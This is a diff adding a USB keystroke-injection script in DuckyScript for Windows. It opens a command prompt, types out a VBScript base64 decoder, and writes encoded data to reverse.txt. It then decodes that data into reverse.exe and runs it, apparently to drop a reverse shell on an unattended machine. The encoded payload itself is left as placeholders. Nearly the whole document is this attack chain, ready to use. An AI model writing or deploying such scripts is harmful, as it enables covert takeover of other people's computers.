@@ -1,0 +1,58 @@
+DELAY 500
+REM Open up CMD.exe
+ESCAPE
+CONTROL ESCAPE
+DELAY 400
+STRING cmd
+ENTER
+DELAY 400
+
+REM Create the decoder
+STRING copy /Y con decoder.vbs
+ENTER
+STRING Dim arguments, inFile, outFile
+ENTER
+STRING Set arguments = WScript.Arguments : inFile = arguments(0) : outFile = arguments(1)
+ENTER
+STRING dim objFS, objTS : set objFS = CreateObject("Scripting.FileSystemObject") : set objTS = objFS.OpenTextFile(inFile, 1)
+ENTER
+STRING Dim base64Encoded, base64Decoded : base64Encoded = objTS.ReadAll : base64Decoded = decodeBase64(base64Encoded)
+ENTER
+STRING writeBytes outFile, base64Decoded
+ENTER
+STRING private function decodeBase64(base64)
+ENTER
+STRING dim DM, EL : Set DM = CreateObject("Microsoft.XMLDOM") : Set EL = DM.createElement("tmp")
+ENTER
+STRING EL.DataType = "bin.base64" : EL.text = base64
+ENTER
+STRING decodeBase64 = EL.NodeTypedValue
+ENTER
+STRING end function
+ENTER
+STRING private Sub writeBytes(file, bytes)
+ENTER
+STRING Dim binaryStream : Set binaryStream = CreateObject("ADODB.Stream")
+ENTER
+STRING binaryStream.Type = 1 : binaryStream.Open : binaryStream.Write bytes : binaryStream.SaveToFile file, 2
+ENTER
+STRING End Sub
+ENTER
+CTRL z
+ENTER
+
+# Payload 1
+STRING copy /Y con reverse.txt
+ENTER
+STRING <base64_snippet>
+ENTER
+STRING <base64_snippet>
+ENTER
+CTRL z
+ENTER
+STRING cscript decoder.vbs reverse.txt reverse.exe
+ENTER
+STRING reverse.exe 
+ENTER
+STRING exit
+ENTER
